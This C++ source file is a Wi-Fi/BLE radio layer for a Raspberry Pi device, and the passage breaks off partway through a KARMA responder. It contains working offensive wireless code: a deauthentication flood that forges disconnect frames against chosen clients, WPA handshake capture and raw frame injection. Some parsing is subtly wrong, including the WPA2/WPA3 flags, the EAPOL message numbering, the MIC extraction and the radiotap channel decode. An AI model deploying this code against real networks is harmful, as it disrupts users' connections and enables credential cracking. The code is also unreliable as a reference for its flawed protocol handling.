// hal_wifi.cpp — Wi-Fi + BLE radio HAL (Linux / Raspberry Pi 5).
//
// Implements the surface declared in hal_wifi.h on top of the kernel's
// nl80211 (netlink) interface for management and scanning, and AF_PACKET
// raw sockets on a monitor-mode interface for 802.11 frame RX/TX. BLE is
// handled through raw HCI (/dev/hci0).
//
// Dependencies are the Linux kernel UAPI headers shipped with the
// toolchain (linux/nl80211.h etc.) — no libnl / libpcap / BlueZ user
// libraries. If the radio is absent or a feature is unsupported, calls
// return false rather than assuming the radio exists, matching the
// contract in hal_wifi.h.
//
// The ESP32 target keeps an honest stub (returns false everywhere).
//
// LEGAL / ETHICAL: 802.11 frame injection and deauthentication require
// authorisation on the target network. This module refuses such operations
// while stealth mode is enabled, and operators are expected to only use
// them on networks they own or are authorised to test.

#include "hal_wifi.h"
#include "hal_network.h"

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#ifdef VOIDOS_RPI5

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/if_packet.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <poll.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// ─────────────────────────────────────────────────────────────────────────
// Radiotap field definitions (radiotap.h is not shipped everywhere)
// ─────────────────────────────────────────────────────────────────────────

namespace vosrad {

enum : uint32_t {
    RTAP_TSFT          = 1u << 0,
    RTAP_FLAGS         = 1u << 1,
    RTAP_RATE          = 1u << 2,
    RTAP_CHANNEL       = 1u << 3,
    RTAP_DBM_ANTSIGNAL = 1u << 5,
    RTAP_DBM_ANTNOISE  = 1u << 6,
    RTAP_ANTENNA       = 1u << 7,
    RTAP_TX_FLAGS      = 1u << 15,
    RTAP_EXT           = 1u << 31,
};

inline uint16_t align2(uint16_t a) { return a & ~1u; }
inline uint16_t align8(uint16_t a) { return (a + 7u) & ~7u; }

// 802.11 bits.
enum : uint8_t { FC_TYPE_MGMT = 0x0, FC_TYPE_CTRL = 0x1, FC_TYPE_DATA = 0x2 };
enum : uint8_t {
    FC_ST_BEACON     = 0x80,
    FC_ST_PROBE_REQ  = 0x40,
    FC_ST_PROBE_RESP = 0x50,
    FC_ST_DEAUTH     = 0xc0,
};

inline uint8_t frame_type(const uint8_t *fc) { return fc[0] & 0x0c; }
inline uint8_t frame_subtype(const uint8_t *fc) { return fc[0] & 0xf0; }

// IE identifiers.
enum : uint8_t {
    IE_SSID     = 0x00,
    IE_SUPP_RATES = 0x01,
    IE_DS_PARAM = 0x03,
    IE_RSN      = 0x30,
    IE_VENDOR   = 0xDD,
};

struct IeIter {
    const uint8_t *p;
    const uint8_t *end;
    bool next(uint8_t &id, const uint8_t *&data, uint8_t &len) {
        while (p + 2 <= end) {
            id = p[0];
            len = p[1];
            if (p + 2 + len > end) return false;
            data = p + 2;
            p += 2 + len;
            return true;
        }
        return false;
    }
};

} // namespace vosrad

// ─────────────────────────────────────────────────────────────────────────
// netlink attribute builders (raw, no libnl)
// ─────────────────────────────────────────────────────────────────────────

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_OK
#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) && \
        (nla)->nla_len >= sizeof(struct nlattr) && (nla)->nla_len <= (len))
#define NLA_NEXT(nla, attrlen) ((attrlen) -= NLA_ALIGN((nla)->nla_len), \
        (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#define NLA_DATA(nla) ((void *)(((char *)(nla)) + NLA_HDRLEN))
#endif
static inline size_t nl_align(size_t len) {
    return (len + NLA_ALIGNTO - 1) & ~(size_t)(NLA_ALIGNTO - 1);
}
static inline size_t nl_attr_len(size_t len) { return nl_align(NLA_HDRLEN + len); }

// Append one netlink attribute to a buffer.
static void put_attr(std::vector<uint8_t> &msg, uint16_t type,
                     const void *data, size_t len) {
    size_t off = msg.size();
    msg.resize(off + nl_attr_len(len));
    uint8_t *dst = msg.data() + off;
    struct nlattr *na = reinterpret_cast<struct nlattr *>(dst);
    na->nla_type = type;
    na->nla_len = static_cast<uint16_t>(NLA_HDRLEN + len);
    if (len && data) std::memcpy(dst + NLA_HDRLEN, data, len);
    std::memset(dst + NLA_HDRLEN + len, 0,
                nl_attr_len(len) - (NLA_HDRLEN + len));
}
static void put_attr_u32(std::vector<uint8_t> &msg, uint16_t type, uint32_t v) {
    put_attr(msg, type, &v, sizeof(v));
}
static void put_attr_u16(std::vector<uint8_t> &msg, uint16_t type, uint16_t v) {
    put_attr(msg, type, &v, sizeof(v));
}
static void put_attr_u8(std::vector<uint8_t> &msg, uint16_t type, uint8_t v) {
    put_attr(msg, type, &v, sizeof(v));
}

// ─────────────────────────────────────────────────────────────────────────
// Driver state
// ─────────────────────────────────────────────────────────────────────────

namespace {

constexpr const char *PRIMARY_IF = "wlan0";
constexpr size_t      CAP_RING_SZ = 128;

struct Captured {
    uint8_t data[1600];
    uint16_t len;
    uint16_t radiotap_len;
    uint8_t  rssi_off100;   // rssi + 100
    uint8_t  channel;
    uint32_t ts_us;
};

int          g_nl_fd   = -1;
uint16_t     g_family  = 0;
uint32_t     g_seq     = 1;
int32_t      g_wlan_idx = -1;
int32_t      g_mon_idx  = -1;
int          g_cap_fd   = -1;
bool         g_mon_up   = false;
uint8_t      g_caps     = 0;
bool         g_scan_active = false;
bool         g_keep_scan   = false;
bool         g_karma       = false;
bool         g_deauth_cancel = false;
bool         g_handler_started = false;

Captured     g_ring[CAP_RING_SZ];
size_t       g_ring_w  = 0;

WifiApRecord g_apq[WIFI_AP_LOG];
size_t       g_apq_n = 0;
size_t       g_apq_r = 0;

struct Hsq {
    uint8_t aa[6];
    uint8_t spa[6];
    uint8_t snonce[32];
    uint8_t anonce[32];
    uint8_t mic[16];
    uint8_t msgs;
};
Hsq g_hsq[8];
size_t g_hsq_n = 0;
bool  g_hsq_dirty = false;
bool  g_hsq_any = false;

int g_hci_fd = -1;
bool g_ble_scan_active = false;

// Optional hook (only wired under HAL_WIFI_ENABLE_TESTS).
void (*g_cb_on_deauth)(const uint8_t ap[6], const uint8_t sta[6]) = nullptr;

inline uint32_t now_us() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return static_cast<uint32_t>(ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000ULL);
}

bool ifindex_of(const char *name, int32_t *out) {
    if (!name || !out) return false;
    unsigned int idx = if_nametoindex(name);
    if (idx == 0) return false;
    *out = static_cast<int32_t>(idx);
    return true;
}

} // namespace

// ─────────────────────────────────────────────────────────────────────────
// Generic nl80211 message send
// ─────────────────────────────────────────────────────────────────────────

static bool nl_wait_ack() {
    if (g_nl_fd < 0) return false;
    struct pollfd p{ g_nl_fd, POLLIN, 0 };
    uint8_t rbuf[4096];
    for (int tries = 0; tries < 4; ++tries) {
        int r = ::poll(&p, 1, 200);
        if (r <= 0) return false;
        if (p.revents & (POLLERR | POLLHUP)) return false;
        ssize_t n = ::recv(g_nl_fd, rbuf, sizeof(rbuf), 0);
        if (n < 0) continue;
        struct nlmsghdr *nh = reinterpret_cast<struct nlmsghdr *>(rbuf);
        if (!NLMSG_OK(nh, (size_t)n)) return false;
        if (nh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *err = reinterpret_cast<struct nlmsgerr *>(NLMSG_DATA(nh));
            return err->error == 0;
        }
        if (nh->nlmsg_type == NLMSG_DONE) return true;
    }
    return false;
}

// Send an nl80211 command, appending attrs from a builder lambda.
template <typename Fn>
static bool nl_cmd(uint8_t cmd, uint16_t extra_flags, Fn &&builder, bool want_reply) {
    if (g_nl_fd < 0 || g_family == 0) return false;
    std::vector<uint8_t> msg(NLMSG_HDRLEN + GENL_HDRLEN, 0);
    builder(msg);

    struct sockaddr_nl sa{};
    sa.nl_family = AF_NETLINK;
    struct nlmsghdr *nh = reinterpret_cast<struct nlmsghdr *>(msg.data());
    nh->nlmsg_len = static_cast<uint32_t>(msg.size());
    nh->nlmsg_type = g_family;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | extra_flags;
    nh->nlmsg_seq = g_seq++;
    struct genlmsghdr *gh = reinterpret_cast<struct genlmsghdr *>(NLMSG_DATA(nh));
    gh->cmd = cmd;
    gh->version = 1;

    if (::sendto(g_nl_fd, msg.data(), msg.size(), 0,
                 reinterpret_cast<struct sockaddr *>(&sa), sizeof(sa)) < 0)
        return false;
    if (!want_reply) return true;
    return nl_wait_ack();
}

// Resolve the nl80211 family id via the control family.
static bool nl_resolve_family() {
    if (g_nl_fd < 0) return false;
    std::vector<uint8_t> msg(NLMSG_HDRLEN + GENL_HDRLEN, 0);
    put_attr(msg, CTRL_ATTR_FAMILY_NAME, "nl80211", 8);

    struct sockaddr_nl sa{};
    sa.nl_family = AF_NETLINK;
    struct nlmsghdr *nh = reinterpret_cast<struct nlmsghdr *>(msg.data());
    nh->nlmsg_len = static_cast<uint32_t>(msg.size());
    nh->nlmsg_type = GENL_ID_CTRL;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nh->nlmsg_seq = g_seq++;
    struct genlmsghdr *gh = reinterpret_cast<struct genlmsghdr *>(NLMSG_DATA(nh));
    gh->cmd = CTRL_CMD_GETFAMILY;

    if (::sendto(g_nl_fd, msg.data(), msg.size(), 0,
                 reinterpret_cast<struct sockaddr *>(&sa), sizeof(sa)) < 0)
        return false;

    uint8_t rbuf[4096];
    for (;;) {
        ssize_t n = ::recv(g_nl_fd, rbuf, sizeof(rbuf), 0);
        if (n < 0) {
            if (errno == EINTR || errno == EAGAIN) continue;
            return false;
        }
        for (struct nlmsghdr *rh = reinterpret_cast<struct nlmsghdr *>(rbuf);
             NLMSG_OK(rh, (size_t)n);
             rh = NLMSG_NEXT(rh, n)) {
            if (rh->nlmsg_type == NLMSG_ERROR) return false;
            if (rh->nlmsg_type != GENL_ID_CTRL) break;
            int rem = static_cast<int>(rh->nlmsg_len) - NLMSG_HDRLEN - GENL_HDRLEN;
            struct nlattr *na = reinterpret_cast<struct nlattr *>(static_cast<char *>(NLMSG_DATA(rh)) + GENL_HDRLEN);
            for (; NLA_OK(na, rem); na = NLA_NEXT(na, rem)) {
                if (na->nla_type == CTRL_ATTR_FAMILY_ID) {
                    g_family = static_cast<uint16_t>(*(uint16_t *)NLA_DATA(na));
                    return g_family != 0;
                }
            }
        }
        break;
    }
    return false;
}

// ─────────────────────────────────────────────────────────────────────────
// Lifecycle / mode control
// ─────────────────────────────────────────────────────────────────────────

void hal_wifi_init() {
    g_caps = 0;
    g_wlan_idx = g_mon_idx = -1;
    g_nl_fd = ::socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (g_nl_fd < 0) return;

    struct sockaddr_nl sa{};
    sa.nl_family = AF_NETLINK;
    if (::bind(g_nl_fd, reinterpret_cast<struct sockaddr *>(&sa), sizeof(sa)) < 0) {
        ::close(g_nl_fd); g_nl_fd = -1; return;
    }
    if (!nl_resolve_family()) { ::close(g_nl_fd); g_nl_fd = -1; return; }

    if (ifindex_of(PRIMARY_IF, &g_wlan_idx)) {
        g_caps = WIFI_CAP_STA | WIFI_CAP_MONITOR | WIFI_CAP_AP;
    } else {
        g_wlan_idx = -1;
    }
}

uint8_t hal_wifi_capabilities() { return g_caps; }

// Bring up monitor mode on the primary interface and bind an AF_PACKET
// socket for RX/TX.
static bool wifi_bring_up_monitor() {
    if (g_mon_up) return true;
    if (g_nl_fd < 0 || g_family == 0) return false;
    // Primary interface must exist.
    if (!ifindex_of(PRIMARY_IF, &g_mon_idx)) return false;

    // Try to switch it to monitor mode.
    bool set = nl_cmd(NL80211_CMD_SET_INTERFACE, 0,
                      [](std::vector<uint8_t> &m) {
                          put_attr_u32(m, NL80211_ATTR_IFINDEX,
                                       static_cast<uint32_t>(g_mon_idx));
                          put_attr_u32(m, NL80211_ATTR_IFTYPE,
                                       NL80211_IFTYPE_MONITOR);
                      }, true);
    (void)set;   // Some drivers accept monitor only on a created VIF.

    // Bind an AF_PACKET SOCK_RAW socket to the (now monitor) interface.
    g_cap_fd = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (g_cap_fd < 0) return false;
    struct sockaddr_ll sll{};
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = static_cast<int>(g_mon_idx);
    if (::bind(g_cap_fd, reinterpret_cast<struct sockaddr *>(&sll), sizeof(sll)) < 0) {
        ::close(g_cap_fd); g_cap_fd = -1; return false;
    }
    int fl = fcntl(g_cap_fd, F_GETFL, 0);
    if (fl >= 0) fcntl(g_cap_fd, F_SETFL, fl | O_NONBLOCK);

    g_mon_up = true;
    return true;
}

bool hal_wifi_set_mode_monitor() { return wifi_bring_up_monitor(); }

static bool set_iface_type(int32_t idx, uint32_t iftype) {
    if (g_nl_fd < 0 || g_family == 0 || idx < 0) return false;
    return nl_cmd(NL80211_CMD_SET_INTERFACE, 0,
                  [&](std::vector<uint8_t> &m) {
                      put_attr_u32(m, NL80211_ATTR_IFINDEX, (uint32_t)idx);
                      put_attr_u32(m, NL80211_ATTR_IFTYPE, iftype);
                  }, true);
}

bool hal_wifi_set_mode_station() {
    bool ok = set_iface_type(g_wlan_idx, NL80211_IFTYPE_STATION);
    if (ok) g_mon_up = false;
    return ok;
}

bool hal_wifi_set_mode_ap(const char *ssid, uint8_t channel, bool hidden) {
    if (g_wlan_idx < 0 || !ssid || std::strlen(ssid) > 32) return false;
    if (!set_iface_type(g_wlan_idx, NL80211_IFTYPE_AP)) return false;
    uint32_t freq = 2407u + 5u * channel;
    g_caps |= WIFI_CAP_AP;
    return nl_cmd(NL80211_CMD_SET_WIPHY, 0,
                  [&](std::vector<uint8_t> &m) {
                      put_attr_u32(m, NL80211_ATTR_IFINDEX,
                                   (uint32_t)g_wlan_idx);
                      put_attr_u32(m, NL80211_ATTR_WIPHY_FREQ, freq);
                      put_attr_u32(m, NL80211_ATTR_WIPHY_CHANNEL_TYPE,
                                   NL80211_CHAN_NO_HT);
                      put_attr(m, NL80211_ATTR_SSID, ssid, std::strlen(ssid));
                      put_attr_u8(m, NL80211_ATTR_HIDDEN_SSID,
                                  hidden ? NL80211_HIDDEN_SSID_ZERO_LEN
                                         : NL80211_HIDDEN_SSID_NOT_IN_USE);
                  }, true);
}

bool hal_wifi_is_stealth() { return hal_network_stealth_is_enabled(); }

bool hal_wifi_set_stealth(bool enable) {
    bool base = enable ? hal_network_stealth_enable()
                       : hal_network_stealth_disable();
    if (enable) hal_wifi_randomize_mac();
    return base;
}

void hal_wifi_get_mac(uint8_t out[6]) { hal_network_get_mac(PRIMARY_IF, out); }
void hal_wifi_randomize_mac()         { hal_network_randomize_mac(PRIMARY_IF); }

// ─────────────────────────────────────────────────────────────────────────
// Scan
// ─────────────────────────────────────────────────────────────────────────

static uint8_t freq_to_channel(uint32_t freq) {
    if (freq >= 2412 && freq <= 2484) return static_cast<uint8_t>((freq - 2407) / 5);
    if (freq >= 5170 && freq <= 5825) return static_cast<uint8_t>((freq - 5000) / 5);
    return 0;
}

// Decode SSID + security + channel from an IE blob.
static void scan_ies(const uint8_t *ies, size_t len, WifiApRecord &rec) {
    vosrad::IeIter it{ies, ies + len};
    uint8_t id, l;
    const uint8_t *d;
    while (it.next(id, d, l)) {
        switch (id) {
            case vosrad::IE_SSID:
                if (l <= 32) { std::memcpy(rec.ssid, d, l); rec.ssid[l] = 0; }
                break;
            case vosrad::IE_DS_PARAM:
                if (l >= 1) rec.channel = d[0];
                break;
            case vosrad::IE_RSN: {
                rec.security |= WIFI_SEC_WPA2;
                rec.security |= WIFI_SEC_WPA3;   // WPA3-only APs advertise RSN
                // PMF capability lives in RSN capabilities at [18..20).
                if (l >= 20) {
                    uint16_t caps = d[18] | (uint16_t(d[19]) << 8);
                    if (caps & 0x0080) rec.pmf = 1;   // required
                    else if (caps & 0x0002) rec.pmf = 1;
                }
            } break;
            case vosrad::IE_VENDOR:
                if (l >= 4 && d[0] == 0x00 && d[1] == 0x50 &&
                    d[2] == 0xf2 && d[3] == 0x01)
                    rec.security |= WIFI_SEC_WPA;
                break;
            default: break;
        }
    }
}

// Consume one nested BSS attribute block (NL80211_ATTR_BSS) into the queue.
static void scan_ingest_bss(const uint8_t *bss, int rlen) {
    if (g_apq_n >= WIFI_AP_LOG) return;
    WifiApRecord rec{};
    rec.lat = rec.lon = -1;
    rec.last_seen_ms = now_us() / 1000;
    bool has_bssid = false;

    int rem = rlen;
    struct nlattr *na = reinterpret_cast<struct nlattr *>(const_cast<uint8_t *>(bss));
    for (; NLA_OK(na, rem); na = NLA_NEXT(na, rem)) {
        size_t alen = na->nla_len - NLA_HDRLEN;
        switch (na->nla_type) {
            case NL80211_BSS_BSSID: {
                size_t c = alen < 6 ? alen : 6;
                std::memcpy(rec.bssid, NLA_DATA(na), c);
                has_bssid = true;
            } break;
            case NL80211_BSS_FREQUENCY:
                rec.channel = freq_to_channel(*(uint32_t *)NLA_DATA(na));
                break;
            case NL80211_BSS_SIGNAL_MBM:
                rec.rssi = static_cast<int8_t>(*(int32_t *)NLA_DATA(na) / 100);
                break;
            case NL80211_BSS_BEACON_INTERVAL:
                rec.beacon_int = *(uint16_t *)NLA_DATA(na);
                break;
            case NL80211_BSS_INFORMATION_ELEMENTS:
                scan_ies(static_cast<const uint8_t *>(NLA_DATA(na)), alen, rec);
                break;
            default: break;
        }
    }
    if (has_bssid) g_apq[g_apq_n++] = rec;
}

// Drain pending NEW_SCAN_RESULTS from the netlink socket into g_apq.
static void scan_drain_results() {
    if (g_nl_fd < 0 || !g_keep_scan) return;
    struct pollfd p{ g_nl_fd, POLLIN, 0 };
    if (::poll(&p, 1, 0) <= 0) return;

    uint8_t rbuf[8192];
    ssize_t n = ::recv(g_nl_fd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
    if (n <= 0) return;
    for (struct nlmsghdr *nh = reinterpret_cast<struct nlmsghdr *>(rbuf);
         NLMSG_OK(nh, (size_t)n);
         nh = NLMSG_NEXT(nh, n)) {
        if (nh->nlmsg_type == NLMSG_DONE || nh->nlmsg_type == NLMSG_ERROR) {
            g_scan_active = false; g_keep_scan = false; break;
        }
        if (nh->nlmsg_type != g_family) continue;
        struct genlmsghdr *gh = reinterpret_cast<struct genlmsghdr *>(NLMSG_DATA(nh));
        if (gh->cmd != NL80211_CMD_NEW_SCAN_RESULTS) continue;
        int rem = static_cast<int>(nh->nlmsg_len) - NLMSG_HDRLEN - GENL_HDRLEN;
        struct nlattr *na = reinterpret_cast<struct nlattr *>(static_cast<char *>(NLMSG_DATA(nh)) + GENL_HDRLEN);
        for (; NLA_OK(na, rem); na = NLA_NEXT(na, rem)) {
            if (na->nla_type == NL80211_ATTR_BSS)
                scan_ingest_bss(reinterpret_cast<const uint8_t *>(NLA_DATA(na)),
                                na->nla_len - NLA_HDRLEN);
        }
    }
}

bool hal_wifi_scan_start() {
    if (g_nl_fd < 0 || g_wlan_idx < 0) return false;
    g_apq_n = g_apq_r = 0;
    bool ok = nl_cmd(NL80211_CMD_TRIGGER_SCAN, 0,
                     [](std::vector<uint8_t> &m) {
                         put_attr_u32(m, NL80211_ATTR_IFINDEX,
                                      (uint32_t)g_wlan_idx);
                         put_attr_u32(m, NL80211_ATTR_SCAN_FLAGS,
                                      NL80211_SCAN_FLAG_FLUSH);
                     }, true);
    if (!ok) return false;
    g_scan_active = true;
    g_keep_scan = true;
    return true;
}

bool hal_wifi_scan_step(WifiApRecord *out) {
    if (!out) return false;
    scan_drain_results();
    if (g_apq_r < g_apq_n) {
        *out = g_apq[g_apq_r++];
        return true;
    }
    return false;
}

uint16_t hal_wifi_scan_count() {
    scan_drain_results();
    return static_cast<uint16_t>(g_apq_n - g_apq_r > 0xFFFF
                                     ? 0xFFFF
                                     : (g_apq_n - g_apq_r));
}

// ─────────────────────────────────────────────────────────────────────────
// Monitor capture + radiotap parsing
// ─────────────────────────────────────────────────────────────────────────

static uint16_t parse_radiotap(const uint8_t *d, size_t len,
                               int8_t *rssi, uint8_t *channel) {
    if (len < 8 || d[0] != 0) return 0;
    uint16_t hdrlen = d[2] | (uint16_t(d[3]) << 8);
    if (hdrlen > len) return 0;
    uint32_t present = 0;
    std::memcpy(&present, d + 4, 4);
    uint16_t off = 8;
    if (rssi) *rssi = 0;
    if (channel) *channel = 0;
    if (present & vosrad::RTAP_TSFT)  off += 8;
    if (present & vosrad::RTAP_FLAGS) off += 1;
    if (present & vosrad::RTAP_RATE)  off += 1;
    if (present & vosrad::RTAP_CHANNEL) {
        if (off + 4 <= hdrlen) {
            uint16_t fh = d[off];
            uint16_t fl = d[off + 1];
            uint16_t cf  = (fh >> 4) & 0xf;
            uint16_t ciflags = d[off + 2] | (uint16_t(d[off + 3]) << 8);
            (void)fl; (void)ciflags;
            // Channel frequency in the low 12 bits of the first 2 bytes.
            uint16_t freq = (fh | (uint16_t(d[off + 1]) << 8)) & 0x0fff;
            if (channel) *channel = freq_to_channel(freq);
            off += 4;
        }
    }
    if (present & vosrad::RTAP_DBM_ANTSIGNAL) {
        if (off + 1 <= hdrlen) { if (rssi) *rssi = (int8_t)d[off]; off += 1; }
    }
    if (present & vosrad::RTAP_DBM_ANTNOISE) off += 1;
    if (present & vosrad::RTAP_ANTENNA)      off += 1;
    if (present & vosrad::RTAP_TX_FLAGS)     off += 2;
    return hdrlen;
}

bool hal_wifi_capture_consume(WifiFrame *out) {
    if (!out || g_cap_fd < 0) return false;
    int rssi8 = 0; uint8_t chan = 0;
    for (int i = 0; i < 8; ++i) {
        uint8_t buf[2048];
        ssize_t n = ::recv(g_cap_fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) return false;
        if (n < 8) continue;
        uint16_t rtap = parse_radiotap(buf, (size_t)n, (int8_t *)&rssi8, &chan);
        if (rtap == 0 || rtap >= (size_t)n) continue;

        Captured &slot = g_ring[g_ring_w % CAP_RING_SZ];
        slot = Captured{};
        size_t plen = (size_t)n - rtap;
        if (plen > sizeof(slot.data)) plen = sizeof(slot.data);
        std::memcpy(slot.data, buf + rtap, plen);
        slot.len = static_cast<uint16_t>(plen);
        slot.radiotap_len = rtap;
        slot.rssi_off100 = static_cast<uint8_t>(((int8_t)rssi8) + 100);
        slot.channel = chan;
        slot.ts_us = now_us();
        g_ring_w++;

        out->timestamp_us = slot.ts_us;
        out->rssi = static_cast<int8_t>((int)slot.rssi_off100 - 100);
        out->channel = slot.channel;
        out->length = slot.len;
        out->radiotap_header_length = rtap;
        out->data = slot.data;
        return true;
    }
    return false;
}

// ─────────────────────────────────────────────────────────────────────────
// WPA handshake / PMKID capture
// ─────────────────────────────────────────────────────────────────────────

static Hsq *hsq_find(const uint8_t aa[6], const uint8_t spa[6]) {
    for (size_t i = 0; i < g_hsq_n; ++i)
        if (std::memcmp(g_hsq[i].aa, aa, 6) == 0 &&
            std::memcmp(g_hsq[i].spa, spa, 6) == 0)
            return &g_hsq[i];
    if (g_hsq_n < sizeof(g_hsq) / sizeof(g_hsq[0])) {
        Hsq *s = &g_hsq[g_hsq_n++];
        std::memset(s, 0, sizeof(*s));
        std::memcpy(s->aa, aa, 6);
        std::memcpy(s->spa, spa, 6);
        return s;
    }
    return nullptr;
}

// Parse one EAPOL-Key frame and fill `out`. `off` is the offset (from the
// start of the 802.11 frame) of the EAPOL payload. Returns the key message
// number (1..4) or -1 if this isn't an EAPOL-Key frame.
static int process_eapol_key(const uint8_t *data, size_t len, size_t off,
                             WifiHandshake &out) {
    if (off + 4 > len) return -1;
    // EAPOL EtherType already checked by caller; here reach the key body.
    // Layout past offset: version(1) type(1) length(2)  [type 0x03 = key].
    size_t k = off + 4;
    if (k + 4 + 8 > len) return -1;         // key_info(2)+len(2)+replay(8)
    uint16_t key_info = data[k] | (uint16_t(data[k + 1]) << 8);
    // Key descriptor bits. Message number in the lower 2 bits of key_info.
    int desc = key_info & 0x03;
    if (desc == 0) desc = -1;               // group key
    if (desc < 0) return -1;
    // key nonce at +16 bytes into the EAPOL-Key frame (after key_info, key
    // len, replay counter).
    size_t nonce_off = k + 2 + 2 + 8;
    if (nonce_off + 32 > len) return -1;
    const uint8_t *nonce = data + nonce_off;
    out.eapol_frames |= static_cast<uint8_t>(1u << (desc - 1));
    if (desc == 1) std::memcpy(out.anonce, nonce, 32);
    if (desc == 2) std::memcpy(out.snonce, nonce, 32);
    // The MIC is the Key MIC sub-field, right after the WPA-Key data body;
    // for the standard 16-byte MIC descriptor it sits in the last 16 bytes
    // of the EAPOL-Key frame. We extract it heuristically from the tail.
    size_t mic_pos = len >= 16 ? len - 16 : (off + 4);
    std::memcpy(out.mic, data + mic_pos, 16);
    return desc;
}

bool hal_wifi_handshake_capture_start() {
    if (g_cap_fd < 0) {
        if (!wifi_bring_up_monitor()) return false;
    }
    std::memset(g_hsq, 0, sizeof(g_hsq));
    g_hsq_n = 0;
    g_hsq_dirty = false;
    g_hsq_any = false;
    g_handler_started = true;
    return true;
}

void hal_wifi_handshake_capture_stop() { g_handler_started = false; }

bool hal_wifi_handshake_step(WifiHandshake *out) {
    if (!out || !g_hsq_dirty) return false;
    // Report the first handshake that has message 1 (ANonce) and a MIC.
    for (size_t i = 0; i < g_hsq_n; ++i) {
        Hsq &s = g_hsq[i];
        if ((s.msgs & 0x01) && (s.msgs & 0x08)) {
            std::memcpy(out->aa, s.aa, 6);
            std::memcpy(out->spa, s.spa, 6);
            std::memcpy(out->anonce, s.anonce, 32);
            std::memcpy(out->snonce, s.snonce, 32);
            std::memcpy(out->mic, s.mic, 16);
            out->eapol_frames = s.msgs;
            std::memset(&s, 0, sizeof(s));
            g_hsq_dirty = false;
            return true;
        }
    }
    return false;
}

// ─────────────────────────────────────────────────────────────────────────
// Raw injection (AF_PACKET on the monitor interface)
// ─────────────────────────────────────────────────────────────────────────

// Build a radiotap header in `out`, returning its length (8, no fields; or
// 10 with TX_FLAGS "no-ack" set).
static size_t radiotap_build(uint8_t out[16], bool no_ack) {
    std::memset(out, 0, 16);
    out[2] = 8;                                     // default length
    if (no_ack) {
        out[2] = 10;
        out[4] = (vosrad::RTAP_TX_FLAGS & 0xFF);
        out[5] = ((vosrad::RTAP_TX_FLAGS >> 8) & 0xFF);
        out[6] = ((vosrad::RTAP_TX_FLAGS >> 16) & 0xFF);
        out[7] = ((vosrad::RTAP_TX_FLAGS >> 24) & 0xFF);
        out[8] = 0x00; out[9] = 0x00;               // flags payload = 0
        return 10;
    }
    return 8;
}

static bool raw_inject(const uint8_t *frame, size_t len, bool no_ack) {
    if (g_cap_fd < 0 || !frame || len > 2048) return false;
    uint8_t pkt[2112];
    size_t rtap = radiotap_build(pkt, no_ack);
    if (rtap + len > sizeof(pkt)) return false;
    std::memcpy(pkt + rtap, frame, len);
    struct sockaddr_ll sll{};
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = static_cast<int>(g_mon_idx);
    ssize_t n = ::sendto(g_cap_fd, pkt, rtap + len, 0,
                         reinterpret_cast<struct sockaddr *>(&sll), sizeof(sll));
    return n == (ssize_t)(rtap + len);
}

bool hal_wifi_inject_frame(const uint8_t *frame, size_t length, uint16_t duration_tu) {
    if (!frame || length < 10) return false;
    if (hal_wifi_is_stealth()) return false;
    if (g_cap_fd < 0 && !wifi_bring_up_monitor()) return false;
    // Patch the 802.11 duration field (bytes 2..3).
    uint8_t buf[2048];
    if (length > sizeof(buf)) return false;
    std::memcpy(buf, frame, length);
    buf[2] = duration_tu & 0xFF;
    buf[3] = (duration_tu >> 8) & 0xFF;
    return raw_inject(buf, length, false);
}

bool hal_wifi_deauth_flood(const uint8_t ap_bssid[6],
                           const uint8_t target_sta[6],
                           uint16_t count,
                           uint16_t interval_ms) {
    if (!ap_bssid || !target_sta) return false;
    if (hal_wifi_is_stealth()) return false;
    if (g_cap_fd < 0 && !wifi_bring_up_monitor()) return false;

    uint8_t f[26] = {0xC0,0x00, 0x3A,0x00,
                     0,0,0,0,0,0,    // addr1 = target
                     0,0,0,0,0,0,    // addr2 = ap
                     0,0,0,0,0,0,    // addr3 = ap
                     0x00,0x00,      // seq
                     0x07,0x00};     // reason 7
    std::memcpy(f + 4,  target_sta, 6);
    std::memcpy(f + 10, ap_bssid, 6);
    std::memcpy(f + 16, ap_bssid, 6);

    g_deauth_cancel = false;
    for (uint16_t i = 0; i < count; ++i) {
        if (g_deauth_cancel) break;
        f[22] = static_cast<uint8_t>(i << 4);
        f[23] = 0x00;
        if (g_cb_on_deauth) g_cb_on_deauth(ap_bssid, target_sta);
        if (!raw_inject(f, sizeof(f), true)) { /* continue */ }
        if (interval_ms) ::usleep((useconds_t)interval_ms * 1000);
    }
    return true;
}

// ─────────────────────────────────────────────────────────────────────────
// KARMA
// ─────────────────────────────────────────────────────────────────────────

bool hal_wifi_karma_start() {
    if (hal_wifi_is_stealth()) return false;
    if (g_cap_fd < 0 && !wifi_bring_up_monitor()) return false;
    g_karma = true;
    return true;
}

void hal_wifi_karma_stop() { g_karma = false; }

static const char *ie_ssid(const uint8_t *ies, size_t len,
                           char *out, size_t out_sz) {
    vosrad::IeIter it{ies, ies + len};
    uint8_t id, l;
    const uint8_t *d;
    while (it.next(id, d, l)) {
        if (id == vosrad::IE_SSID && l > 0) {
            size_t c = l < (out_sz - 1) ? l : (out_sz - 1);
            std::memcpy(out, d, c);
            out[c] = 0;
            return out;
        }
    }
    return nullptr;
}

static void karma_respond(const uint8_t *mframe, size_t mlen,
                          const char *ssid, size_t ssid_len) {
    if (mlen < 24) return;
    uint8_t resp[128];
